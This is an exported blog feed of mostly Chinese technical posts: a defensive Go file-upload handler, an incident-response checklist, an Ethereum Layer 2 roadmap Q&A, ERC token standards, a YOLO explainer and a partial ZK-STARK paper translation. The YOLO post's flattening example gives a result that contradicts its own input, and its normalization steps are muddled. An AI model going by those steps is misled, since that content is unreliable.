class="line"></span><br><span class="line">	fileSize := handler.Size</span><br><span class="line">	<span class="keyword">if</span> fileSize &gt; MaxFileSize &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;File too large&quot;</span>, http.StatusRequestEntityTooLarge)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 服务器端验证 (多层防御)</span></span><br><span class="line">	detectedMimeType, err := mimetype.DetectReader(file)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;Failed to detect MIME type&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> !AllowedMimeTypes[detectedMimeType.String()] &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;Invalid file type&quot;</span>, http.StatusBadRequest)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用 UUID 生成唯一的文件名，避免文件名冲突</span></span><br><span class="line">	newFileName := uuid.New().String() + filepath.Ext(fileName)</span><br><span class="line">	uploadPath := <span class="string">&quot;./uploads/&quot;</span> + newFileName <span class="comment">// 定义上传文件的存储路径</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建上传目录，如果不存在</span></span><br><span class="line">	os.MkdirAll(<span class="string">&quot;./uploads/&quot;</span>, <span class="number">0755</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建文件并保存</span></span><br><span class="line">	newFile, err := os.Create(uploadPath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(w, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> newFile.Close()</span><br><span class="line"></span><br><span class="line">	_, err = io.Copy(newFile, file)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(w, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//  此处添加更严格的安全检查，例如：</span></span><br><span class="line">	<span class="comment">//  1. 使用第三方库进行病毒扫描 (ClamAV, VirusTotal API 等)</span></span><br><span class="line">	<span class="comment">//  2. 更深入的文件内容分析，根据文件类型进行特定检查</span></span><br><span class="line"></span><br><span class="line">	fmt.Fprintf(w, <span class="string">&quot;File uploaded successfully: %s\n&quot;</span>, newFileName)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// isValidFileName 检查文件名是否合法，防止目录遍历攻击等</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isValidFileName</span><span class="params">(fileName <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	re := regexp.MustCompile(<span class="string">`^[a-zA-Z0-9._-]+$`</span>) <span class="comment">// 只允许字母、数字、点、下划线和短横线</span></span><br><span class="line">	<span class="keyword">return</span> re.MatchString(fileName)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/upload&quot;</span>, uploadHandler)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Server listening on port 8080&quot;</span>)</span><br><span class="line">	http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
AllowedMimeTypes: 定义了允许上传的文件类型，使用 map[string]bool 更易于管理。<br>MaxFileSize: 设置了最大文件大小限制。<br>mimetype 库: 使用了 github.com/gabriel-vasile/mimetype 库来更准确地检测 MIME 类型。 这比只依赖 handler.Header.Get(“Content-Type”) 更可靠。<br>UUID 生成文件名: 使用 UUID 生成唯一的文件名，避免文件名冲突和潜在的安全问题。<br>isValidFileName 函数: 对文件名进行简单的验证，防止目录遍历等攻击。 这只是一个基本的示例，实际应用中可能需要更复杂的验证规则。<br>临时文件存储 (缺失但建议): 为了更安全，应该先将文件保存到临时目录，验证通过后再移动到最终存储位置。<br>安全扫描 (缺失但必须): 代码中用注释标注了需要添加安全扫描的地方。 你需要集成一个专业的安全扫描库或服务 (例如 ClamAV, VirusTotal API 等) 来扫描上传的文件是否包含恶意代码。 这是至关重要的安全步骤。</li>
</ol>
<h2 id="Linux-系统排查"><a href="#Linux-系统排查" class="headerlink" title="Linux 系统排查"></a>Linux 系统排查</h2><p>1.查看用户行为<br>/etc/passwd，/etc/shadow 中存储了account和密码信息，黑客可能会增加高权限用户在如上两个文件夹中<br>如 macOS 中，<br>➜  ~ sudo dscl . -list /Users | while read user; do sudo dscl . -read /Users/“$user” UserShell | grep -q ‘/bin/bash’ &amp;&amp; echo $user; done<br>_mbsetupuser<br>postgres<br>➜  ~ last<br>Zzz  ttys000                         Tue Dec 10 14:05   still logged in<br>Zzz  ttys000                         Mon Dec  9 11:29 - 11:29  (00:00)<br>Zzz  ttys000                         Sat Dec  7 19:35 - 19:35  (00:00)<br>Zzz  console                         Tue Dec  3 14:51   still logged in<br>reboot time                                Tue Dec  3 14:50<br>还有，如查看用户的密码是否为空，用户执行过的命令，等等。<br>3.查看进程，例如，黑客通过服务器在挖矿等异常。lspf， top等命令。<br>更多可以查看 Linux 应急响应手册 — <a href="https://github.com/Just-Hack-For-Fun/Linux-INCIDENT-RESPONSE-COOKBOOK">https://github.com/Just-Hack-For-Fun/Linux-INCIDENT-RESPONSE-COOKBOOK</a></p>
<h2 id="威胁情报中心："><a href="#威胁情报中心：" class="headerlink" title="威胁情报中心："></a>威胁情报中心：</h2><p>Windows 系统工具 - <a href="https://learn.microsoft.com/en-us/sysinternals/">https://learn.microsoft.com/en-us/sysinternals/</a><br>腾讯威胁情报中心 - <a href="https://tix.qq.com/">https://tix.qq.com/</a><br>可疑文件分析 - <a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>What should be the roadmap of Layer 2</title>
    <url>/2024/07/25/What%20should%20be%20the%20roadmap%20of%20Layer%202/</url>
    <content><![CDATA[<ol>
<li>Enhancing Scalability and Efficiency:<br> •    Integration with Danksharding: layer 2 should align with Ethereum’s roadmap, particularly the Danksharding upgrade, which will allow for more efficient data handling and reduced costs. This integration will help improve the scalability and performance of Layer 2 solutions ￼.<br> •    Optimizing Rollups: Further development of optimistic rollups to increase throughput and reduce latency. This includes refining the fraud-proof mechanism and enhancing compatibility with Ethereum’s upgrades, such as the introduction of Verkle Trees and Single-Slot Finality ￼.</li>
</ol>
<p>do you have any detail idea, like some protocol or algorithm to implement the Enhancing Scalability and Efficiency with Ethereum upgrade?</p>
<p>To enhance scalability and efficiency, particularly in alignment with Ethereum’s roadmap upgrades like Danksharding, layer 2 can consider implementing specific protocols and algorithms. Here are some detailed ideas:</p>
<h3 id="1-Integration-with-Danksharding"><a href="#1-Integration-with-Danksharding" class="headerlink" title="1. Integration with Danksharding"></a>1. <strong>Integration with Danksharding</strong></h3><p><strong>Protocol/Algorithm Considerations:</strong></p>
<ul>
<li><strong>Data Availability Sampling (DAS)</strong>: Implement DAS to manage the availability of data within Danksharding. This method ensures that data is available and verifiable without requiring all nodes to store it, thus optimizing storage and bandwidth.</li>
<li><strong>Blob Compression and Validation</strong>: Since Danksharding introduces “blobs” of data, layer 2 should develop efficient compression and validation algorithms. These would reduce the size of the blobs while maintaining data integrity, allowing for faster processing and lower storage costs.<h3 id="2-Optimizing-Rollups"><a href="#2-Optimizing-Rollups" class="headerlink" title="2. Optimizing Rollups"></a>2. <strong>Optimizing Rollups</strong></h3><strong>Protocol/Algorithm Considerations:</strong></li>
<li><strong>Enhanced Fraud-Proof Mechanism</strong>: Develop a more efficient fraud-proof mechanism that can quickly detect and resolve discrepancies in transactions. This might involve optimizing the way fraud proofs are generated and verified, potentially using zk-SNARKs for concise and private proofs.</li>
<li><strong>Verkle Trees Integration</strong>: Verkle Trees, a data structure combining vector commitments and Merkle Trees, can be used to store state data more efficiently. This can reduce the storage overhead for nodes, making rollups more scalable. layer 2 should integrate Verkle Trees to enhance the scalability and performance of state verification processes.</li>
<li><strong>Single-Slot Finality Implementation</strong>: To align with Ethereum’s future SSF goals, layer 2 could experiment with similar mechanisms in its Layer 2 environment. This would involve ensuring that transactions can be finalized within a single block proposal slot, reducing latency and improving user experience.</li>
</ul>
<h3 id="3-Advanced-Rollup-Strategies"><a href="#3-Advanced-Rollup-Strategies" class="headerlink" title="3. Advanced Rollup Strategies"></a>3. <strong>Advanced Rollup Strategies</strong></h3><p><strong>Protocol/Algorithm Considerations:</strong></p>
<ul>
<li><strong>Optimistic and ZK-Rollup Hybrid Models</strong>: Combining optimistic rollups with zk-rollup features can offer the benefits of both high throughput and strong security guarantees. This hybrid approach could utilize zk-SNARKs for critical state transitions while maintaining the cost-efficiency of optimistic rollups.</li>
<li><strong>Dynamic Rollup Configuration</strong>: Implement algorithms that can dynamically adjust rollup parameters based on network conditions. For example, adjusting batch sizes or fraud-proof intervals in response to congestion or changes in transaction volume.</li>
</ul>
<h3 id="4-Collaboration-with-Ethereum-Core-Developers"><a href="#4-Collaboration-with-Ethereum-Core-Developers" class="headerlink" title="4. Collaboration with Ethereum Core Developers"></a>4. <strong>Collaboration with Ethereum Core Developers</strong></h3><p>To ensure smooth integration and compatibility with Ethereum’s evolving protocols, layer 2 should work closely with Ethereum core developers. This collaboration could involve sharing insights, participating in EIP discussions, and co-developing solutions to shared challenges, such as scalability and data availability.</p>
<p>By focusing on these areas, layer 2 can effectively leverage Ethereum’s upcoming upgrades, enhancing its own scalability and efficiency while contributing to the overall Ethereum ecosystem.</p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
        <tag>Layer2</tag>
      </tags>
  </entry>
  <entry>
    <title>What is an ERC?</title>
    <url>/2018/02/13/What-is-an-ERC/</url>
    <content><![CDATA[<p>ERC stands for “<strong>Ethereum Request for Comment</strong>” This is Ethereum’s version of a Request for Comments (RFC), a concept devised by the Internet Engineering Task Force. Memos within an RFC contain technical and organizational notes. For ERCs, this includes some technical guidelines for the buildout of the Ethereum network.</p>
<p>This was written by Ethereum developers for the Ethereum community. Thus, the workflow of generating an ERC includes a developer. To create standards for the Ethereum platform, a developer submits an Ethereum Improvement Proposal (EIP). This includes protocol specifications and contract standards. Once that EIP is approved by a committee and finalized, it becomes an ERC. The complete list of EIPs can be found here.</p>
<p>The finalized EIPs give the Ethereum developers a set of implementable standards. This allows Smart Contracts to be built with these standards, which a common interface can access. ERC20 is the most well-known of all the standards within the entire crypto community, and most tokens issued on top of the Ethereum platform use it.</p>
<p>Sources link ==&gt; <a href="https://github.com/OpenZeppelin/openzeppelin-contracts">https://github.com/OpenZeppelin/openzeppelin-contracts</a></p>
<h3 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h3><p>任何 ERC20 代币都能立即兼容以太坊钱包（几乎所有支持以太币的钱包，包括Jaxx、MEW、imToken等，也支持 erc20的代币</p>
<p>The ERC20 standard includes the following functions:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">totalSupply() <span class="comment">//returns total token supply</span></span><br><span class="line">balanceOf(address _owner) <span class="comment">//returns account balance of _owner’s account</span></span><br><span class="line">transfer(address _to, uint256 _value) <span class="comment">//takes in number _value and transfers that amount of tokens to address _to and triggers transferevent</span></span><br><span class="line">transferFrom(address _from, address _to, uint256 _value) <span class="comment">//transfers _value amount of tokens from the address _from to the address _to, and triggers the transfer event.拥有者从 _from地址给 _to地址转账授权范围内的一定额度的一类同质化通证。</span></span><br><span class="line">approve(address _spender, uint256 _value) <span class="comment">//allows _spender to withdraw any number up to _value amount</span></span><br><span class="line">allowance(address _owner, address _spender) <span class="comment">//returns the amount which the_spender is still allowed to withdraw from the _owner</span></span><br><span class="line"><span class="comment">// 授权给_spender账户一定额度。拥有者 _owner给消费者_spender在当前查询账户授权(approve)的额度。</span></span><br></pre></td></tr></table></figure>


<p>The following events are triggered based on the functions above:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">transfer(address indexed _from, address indexed _to, uint256 _value) <span class="comment">//this is triggered whenever tokens are transferred</span></span><br><span class="line">approval(address indexed _owner, address indexed _spender, uint256 _value) <span class="comment">//is triggered on any call to approve()</span></span><br></pre></td></tr></table></figure>

<p>ERC20 was proposed in 2015 and officially formalized in September 2017. It is a great starting point for token standardization. However, some in the developer community have noted that it has certain flaws and vulnerabilities. Additionally, there are some use cases that require something different. </p>
<p>另外，<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC20">https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC20</a> </p>
<h4 id="Extensions-扩张功能"><a href="#Extensions-扩张功能" class="headerlink" title="Extensions\扩张功能"></a>Extensions\扩张功能</h4>







<h4 id="Utilities-工具方法"><a href="#Utilities-工具方法" class="headerlink" title="Utilities\工具方法"></a>Utilities\工具方法</h4>



<h3 id="ERC223"><a href="#ERC223" class="headerlink" title="ERC223"></a>ERC223</h3><p>Status: Open</p>
<p>Date Proposed: 3/5/2017</p>
<p>一句话：ERC223令牌标准可以防止令牌在以太坊网络上丢失。</p>
<p>A post by developer Dexaran describes these two scenarios in detail:</p>
<p>There are two ways of performing a transaction in ERC20 tokens:</p>
<ol>
<li>transfer function.</li>
<li>approve + transferFrom mechanism.</li>
</ol>
<p>Token balance is just a variable in the token contract.</p>
<p>The transaction of a token is a change in the internal variables of the contract. The balance of the sender will be decreased and the balance of the recipient will be increased.</p>
<p>The transfer function will not notify the recipient when the transaction occurs. The recipient will not be able to recognize the incoming transaction! I wrote this illustration of the process that is leading to unhandled transactions and money losses.<br>As a result, if the recipient is a contract, users must transfer their tokens using the approve +transferFrom mechanism. If the recipient is an externally owned account address, users must transfer their tokens via the transfer function. If a user makes a mistake and chooses the wrong function, the token will get stuck inside contract (contract will not recognize a transaction). There will be no way to extract stuck tokens.</p>
<p>His proposed solution to this issue is contained within ERC223. It is very similar to the ERC20 standard, but it solves the problems described above. When tokens are transferred to a smart contract, a special function of that contract is tokenFallback. This allows the receiving contract to decline the tokens or trigger further actions. This can be used in place of the approvefunction in most cases.</p>
<p>由openzeppelin-contracts <code>SafeERC20</code> 完成。</p>
<h3 id="ERC621"><a href="#ERC621" class="headerlink" title="ERC621"></a>ERC621</h3><p>Status: Open</p>
<p>Date Proposed: 5/1/2017</p>
<p>一句话：发行 Token 总量可变。<strong>ERC621</strong> = ERC20 + increaseSupply() + decreaseSupply()</p>
<p>ERC621 is an extension of the ERC20 token standard. It adds two additional functions, increaseSupply and decreaseSupply. This can increase and decrease the token supply in circulation. ERC20 only allows a single token issuance event. This restricts the supply to a certain amount which can’t be changed. ERC621 proposes that totalSupply can be modified.</p>
<h3 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h3><p>Status: Open</p>
<p>Date Proposed: 9/22/2017</p>
<p>一句话：每个代币都是 unique，例如以太猫。</p>
<p>ERC721 is very different than ERC20 and ERC223. It describes a non-fungible token. This means that each token is totally different and each one can have a different value to different users. One way to think about this is to recall CryptoKittes. Each one is its own separate commodity whose value is based on its own rarity and desirability by users.</p>
<p>ERC721 tokens can be used in any exchange, but the token value is “a result of the uniqueness and rareness associated with each token.” The standard functions are name, symbol, totalSupply, balanceOf, ownerOf , approve , takeOwnership , transfer , tokenOfOwnerByIndex, and tokenMetadata. It also defines two events: Transfer and Approval. This article by Gerald Nash does a good job explaining the concept of fungibility as it relates to tokens and goes into good technical detail.</p>
<h3 id="ERC1155"><a href="#ERC1155" class="headerlink" title="ERC1155"></a>ERC1155</h3><p>Status: Final</p>
<p>Date Proposed: 2018-06-17</p>
<p>一句话：ERC-1155的创造者是Enjin coin的CTO Witek Radomski。ERC1155标准定义了一种解决上述问题的新方法。现在“物品”（可能包含ERC20的token或ERC721的token或两者都有）可以被单一的一个合约（打包处理）来定义了。合约里包含区别token们所需的最小量的数据。</p>
<p>ERC1155协议主要包括ERC1155Mintable.sol同质化可增发智能合约和ERC1155NonFungibleMintable.sol非同质化可增发智能合约，本章只讲解同质化可增发智能合约的功能。</p>
]]></content>
      <tags>
        <tag>Token</tag>
      </tags>
  </entry>
  <entry>
    <title>YOLO原理概述</title>
    <url>/2024/07/02/YOLO%E5%8E%9F%E7%90%86%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<p>YOLO（You Only Look Once）是一种用于对象检测的深度学习算法。其基本思想是将对象检测问题转换为回归问题，从而能够在单次前向传播中同时预测多个对象的类别和位置。YOLO通过卷积神经网络（CNN）处理图像，实现高效的实时对象检测。</p>
<h3 id="1-数学原理"><a href="#1-数学原理" class="headerlink" title="1. 数学原理"></a>1. 数学原理</h3><p>1.1 网格划分<br>将输入图像划分为 ( S ✖️ S ) 的网格。每个网格单元负责检测图像中其中心落在该单元中的对象。</p>
<p>1.2 预测边界框<br>每个网格单元预测固定数量的边界框（通常为B个）。每个边界框由以下几个参数表示：<br>    •    ( (x, y) )：边界框中心相对于网格单元的位置。<br>    •    ( w, h )：边界框的宽度和高度，相对于整张图像的归一化值。<br>    •    ( C )：边界框中包含对象的置信度，表示为边界框实际包含对象的概率和预测的边界框与实际边界框的重叠度（IoU）的乘积。<br>每个边界框预测值可以表示为一个5维向量：( (x, y, w, h, C) )。</p>
<p>1.3 预测类概率<br>每个网格单元还预测C个类别的条件概率：( P(Class_i | Object) )。这些概率表示在当前网格单元中存在对象的情况下，各个类别的概率。</p>
<p>1.4 综合预测<br>最终的预测结果结合了类别概率和边界框置信度，计算每个类别的最终置信度分数：<br> P(Class_i) ✖️ C<br>这给出了在每个边界框中存在特定类别对象的置信度分数。</p>
<h3 id="2-计算机算法"><a href="#2-计算机算法" class="headerlink" title="2. 计算机算法"></a>2. 计算机算法</h3><p>YOLO的计算机算法实现包括以下几个主要部分：</p>
<p>2.1 定义输入<br>输入图像被调整为固定大小（如 ( 448 ✖️ 448 )），并归一化到 [0, 1] 范围。</p>
<p>2.2 归一化输入<br>将输入图像像素值归一化，使得每个像素值在 [0, 1] 之间。<br>具体数学步骤：<br>a) 首先计算矩阵中的平均值（μ）; b) 计算所有元素与平均值的绝对差；c) 通过将上一步结果中的所有值平方，累加，除以值的数量，然后计算平方根，来计算标准差；d）通过减去平均值并除以标准差，将输入进行层归一化。</p>
<p>2.3 应用卷积<br>使用多个卷积层提取图像特征。每个卷积层应用卷积核，计算特征图。</p>
<p>2.4 应用最大池化<br>在卷积层之间应用最大池化层（Max Pooling），以减少特征图的尺寸并保留重要特征。<br>在特征图的每个通道上滑动定义的窗口，并在每个位置计算窗口内的最大值。这将生成一个新的下采样特征图，其形状取决于窗口大小和步长。具体步骤如下：<br>%%<br>2.4.1 定义窗口和步长<br>假设我们使用一个  2 ✖️ 2  的窗口，步长为 2。<br>2.4.2 滑动窗口<br>在每个通道上，从左上角开始，按照步长滑动窗口。每次滑动窗口时，计算窗口内的最大值。<br>2.4.3 计算最大值<br>在每个窗口位置，找到该窗口内的最大值。这些最大值组成了下采样后的特征图。 %%</p>
<p>2.5 非线性激活<br>在每个卷积层之后应用非线性激活函数（如ReLU）以引入非线性，使模型能够表示更复杂的函数。</p>
<p>2.6 展平<br>将最终的特征图展平成一个一维向量，为全连接层输入做好准备。<br>%%<br>2.6.1 输入特征图<br>假设输入特征图是一个三维张量，形状为 ( (H, W, D) )，其中 ( H ) 是高度，( W ) 是宽度，( D ) 是深度（通道数）。<br>2.6.2 计算展平后向量的长度<br>展平后的向量长度等于输入特征图所有元素的总数，可以通过以下公式计算：<br> \text{Flattened Length} = H \times W \times D<br>2.6.3 按顺序排列所有元素<br>将特征图中的所有元素按行优先（Row-major order）或列优先（Column-major order）的顺序排列成一维向量。通常使用行优先顺序，这意味着先遍历特征图的每一行，再遍历每一列，最后遍历每个通道。</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  [</span><br><span class="line">    [1, 2, 3],  [4, 5, 6]</span><br><span class="line">  ],</span><br><span class="line">  [</span><br><span class="line">    [7, 8, 9],  [10, 11, 12]</span><br><span class="line">  ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>按行优先顺序排列后，展平的结果为：<br> [1, 4, 7, 10, 2, 5, 8, 11, 3, 6, 9, 12] </p>
<p>%%</p>
<p>2.7 投影到输出形状<br>通过全连接层将展平的特征向量投影到输出形状。输出为一个 ( S ✖️ S ✖️ (B ✖️ 5 + C) ) 的张量，其中B是每个网格单元预测的边界框数量，5表示每个边界框的5个参数（ x, y, w, h, C )，C是类别数。</p>
<p>2.8 组成最终推理<br>通过将边界框参数和类别概率结合起来，组成最终的检测结果。应用非极大值抑制（Non-Maximum Suppression, NMS）来消除冗余边界框，仅保留置信度最高的边界框。</p>
<p>YOLO工作流程总结<br>    1.    输入图像：将图像调整为固定大小并归一化。<br>    2.    特征提取：通过多个卷积层和最大池化层提取图像特征。<br>    3.    非线性激活：应用非线性激活函数。<br>    4.    展平和全连接：将特征图展平并通过全连接层进行预测。<br>    5.    输出预测：生成边界框和类别概率的预测值。<br>    6.    后处理：应用非极大值抑制，得到最终检测结果。<br>通过这些步骤，YOLO实现了快速且高效的对象检测，在多个应用领域中得到了广泛应用。</p>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>图片处理</tag>
      </tags>
  </entry>
  <entry>
    <title>ZK-STARK论文-翻译</title>
    <url>/2020/06/11/ZK-STARK%E8%AE%BA%E6%96%87-%E7%BF%BB%E8%AF%91/</url>
    <content><![CDATA[<p>Scalable，transparent， and post-quantum secure computational ==&gt; <a href="https://eprint.iacr.org/2018/046.pdf">https://eprint.iacr.org/2018/046.pdf</a> 部分内容翻译：</p>
<h3 id="0-介绍"><a href="#0-介绍" class="headerlink" title="0 介绍"></a>0 介绍</h3><h5 id="可扩展式验证的计算完整性，超过密文数据集"><a href="#可扩展式验证的计算完整性，超过密文数据集" class="headerlink" title="可扩展式验证的计算完整性，超过密文数据集"></a>可扩展式验证的计算完整性，超过密文数据集</h5><p>  本文讨论的问题基于如下假设：想象警察 <em>Police</em>(P) 是负责国家法医DNA档案数据库 <em>database</em>(D)，声称一个即将任命(或者据称可能发生腐败案)的DNA档案文件 profile(p)没有出现在D中。加密协议能否说服怀疑者相信警察的声称，并且不进入D或p，不依赖于任何外部信任方（例如，首席大法官）和具有”合理”计算资源？</p>
<p>  DNA配置文件匹配 (<em>DNA profile match</em>, DPM) 示例是一个普遍问题的特殊情况。某一方(<em>party</em>, P)在数据集(D)上执行计算(C)能会有错误报告，而不是正确输出 (C(D))，提出了计算完整性问题 (<em>computational integrity</em> ,CI)，以确保P确实报告C(D)。当数据集 D 是公开时，任何有兴趣验证 CI 的一方 (<em>verifier</em>, V) 都可以在 D 上重新执行 C 并将其输出与 P 报告输出进行比较，因为客户可能会检查餐厅账单，或作为一个新的比特币节点将验证其区块链。此原始的解决方案无法扩展，因为验证器 (Tv)花费的时间与执行程序 (Tc)所需的时间一样大，V 必须读取完整的数据集D。基于加密哈希函数的承诺方案常用于计算大型数据集 Dt，t 时刻状态的”指纹”哈希为cmt。通常，与 Dt 相比，cmt 的长度可以忽略不计，作为公告可以很容易地张贴在块链上。但是，CI 的方案中，我们希望解决扩展性问题，也就是增加参数和计算深度的问题，其中验证时间和计算复杂度近似于 logTc 和 |cmt|(cmt的bit长度)，而不是 Tc 和 |Dt|；至少 验证时间/通信 应该严格小于 Tc 和 |Dt|。</p>
<p>  当数据集 D 包含机密数据时，无法再实现原始的解决方案，并且负责D的P方可能以保密的面纱隐瞒违反计算完整性的行为。当对机密数据强制实施 CI 的方法则依赖于”受信任方”，例如审计师或会计师代表公众验证计算。此解决方案不提供可扩展，就像数据公开的方案一样。更糟糕的是，它要求公众信任第三方，这创造了一个潜在的协议中的失败点，因为第三方可能违反协议，如收到恶意方贿赂或胁迫。</p>
<p>  零知识(ZK)证明和论证系统是取代人工审核员的自动化协议。为了保证计算完整性同时基于机密数据，实现有效的计算，消除腐败并降低成本。ZK系统中，S和计算C是一对随机算法，S=(P, V)；证明人 P 是用于证明计算完整性的算法；验证人 V 检验这样子的证明(proofs)。S 的完整性和健全性意味着 P 可以有效地证明所有真相，但无法说服 V 任何谬论。关于 ZK 系统针对通用计算的可扩展式验证，最早出现在1990年代，基于 <em>Probabilistically Checkable Proofs (PCP)</em> 这一篇论文。PCP 定理提供了一种平衡，证明人构建证明花费的时间(Tp)和验证人验证的时间(Tv)的平衡。这种平衡意味着生成证明的时间多项式式增加(Tp=Tc多项式)，同时验证时间指数式增加(Tv=logTc多项式)。</p>
<h5 id="基于PCP定理（ZK-PCP）的ZK系统具有三个附加优点，这使得公众信任计算完整性至关重要。"><a href="#基于PCP定理（ZK-PCP）的ZK系统具有三个附加优点，这使得公众信任计算完整性至关重要。" class="headerlink" title="基于PCP定理（ZK-PCP）的ZK系统具有三个附加优点，这使得公众信任计算完整性至关重要。"></a>基于PCP定理（ZK-PCP）的ZK系统具有三个附加优点，这使得公众信任计算完整性至关重要。</h5><p>  (一) 这些构建安全的假设被建造起来了。即交互式解决方案具有抗碰撞哈希函数，非交互式函数具有对随机函数(“随机预言模型”) 的通用访问权限，这些理论基础在目前认为还不会受到大型量子计算机的影响，我们称之为后量子安全(<em>post-quantum secure</em>)。量子计算机规模以及对后量子密码协议的需求都在增长，如，美国国家标准与技术研究院技术(NIST)强调了后量子安全ZK解决方案的重要性。</p>
<p>  (二) ZK-PCP是知识证明(<em>proof of knowledge</em>, POK)系统，或者当如上所述实现时，是知识论证(<em>argument of knowledge</em>, ARK)系统。非正式地，在DPM示例的背景下，ZK-ARK是一个证明，使公众相信警察已经使用了“真实的”数据集Dt和总统候选人DNA配置文件p，总统候选人的承诺是先前已经宣布过的。</p>
<p>  (三)  最重要的是，ZK-PCP是透明的 (或“公共随机性”)，这意味着验证者使用的随机性是公共的。特别是，与更加新一些的ZK解决方案（包括Zcash加密货币使用的解决方案）相比，ZK-PCP不需要外部受信任的设置阶段。透明性对于能否取得公众信任至关重要，因为它限制了当事人P滥用系统的能力，因为，只要在可观察的宇宙中存在不可预测的事物，透明的系统就是公众可能会信赖的系统。</p>
<h5 id="综上所述，ZK-PCP是确保公众对机密数据CI信任的最佳方法，并具有六项核心优点。"><a href="#综上所述，ZK-PCP是确保公众对机密数据CI信任的最佳方法，并具有六项核心优点。" class="headerlink" title="综上所述，ZK-PCP是确保公众对机密数据CI信任的最佳方法，并具有六项核心优点。"></a>综上所述，ZK-PCP是确保公众对机密数据CI信任的最佳方法，并具有六项核心优点。</h5><p>  (一) 透明性；</p>
<p>  (二) 普遍性—适用于任何有效的计算C，即使它需要上述Dt之类的辅助输入；</p>
<p>  (三) 机密性，即零知识性(ZK)—请勿破坏Dt等辅助输入；</p>
<p>  (四) 后量子安全；</p>
<p>  (五) 基于知识的证明(或者论据)；</p>
<p>  (六) 可扩展的验证。</p>
<p>  虽然 ZK-PCP在上个世纪90年代已经被知晓，但并没有被实现，因为“PCP定理产生的证明既漫长又复杂，以至于要花费数千年的时间来生成和检验它们，并且将需要比宇宙中原子更多的存储位”。ZK系统在为通用计算的努力过程中，仍没有完全实现 (一) — (六) 的替代技术上，尽管某些算法对于某些具体的电路尺寸和计算开销是有效的。</p>
<h3 id="1-本文的主要贡献"><a href="#1-本文的主要贡献" class="headerlink" title="1 本文的主要贡献"></a>1 本文的主要贡献</h3><p>  我们在IOP(Interactive Oracle Proofs)模型中提出了一个（双重）可扩展和透明的ZK系统的新结构（Scalable Transparent IOP of Knowledge, ZK-STIK）。我们将该系统实现为ZK-STARK，并将其应用于概念验证POC“有意义”的计算，该计算本质上是高度顺序的，如前面介绍的DPM问题。我们实现了如下两点：</p>
<p>  (一) 验证时间严格小于原始运行时间 (Tv&lt;Tc)</p>
<p>  (二) 通信复杂度严格小于见证人大小</p>
<p>  本系统中核心创新和改进性能的主要来源是对IOP模型的扩展，包括快速FRI (Fast Reed-Solomon (RS) IOP of Proximity (IOPP)) 协议，这里的IOP是 <em>Interactive Oracle Proofs</em>，还有一个新的算法规程。我们强调，验证时间和验证大小适用于为任意见证者定义的任何计算，尽管加速实现的具体点取决于计算的复杂性。</p>
<h5 id="DNA档案匹配计算"><a href="#DNA档案匹配计算" class="headerlink" title="DNA档案匹配计算"></a>DNA档案匹配计算</h5><p>ZK-STARK是一个“有意义”的概念验证(POC)，特别适用于DNA档案匹配问题(DNA profile match (DPM))。该计算做出了以下场景假设：假设警察(充当证明人P)负责国家法医DNA档案数据库(D)，并且在先前时间的t，发布数据库状态Dt(例如，在区块链上)隐藏承诺cmt。警察现在声称，即将任命的和据称腐败的总统候选人的DNA档案p没有出现在Dt中，因此希望以可扩展的方式创建一个有说服力的证据，使得公众认为DPM计算正确无误，并且警方报告的输出(关于p和Dt)是正确的。</p>
<p>在超过50个国家/地区中使用的DNA图谱的主要标准是联合DNA索引系统(CODIS)格式； 根据该标准，个人由其DNA的短串联重复序列(STR)表示，针对一组20个“核心基因”进行了测量。假定对CODIS数据库状态Dt的承诺(commitment) cmt是公共信息(如，在时间t，公开于区块链之上)，对于总统候选人简历p的承诺是cmp。我们假设p是由独立实验室提取的，然后在公开发布cmp时将其(秘密地)交给了警察。 假设警察宣布：</p>
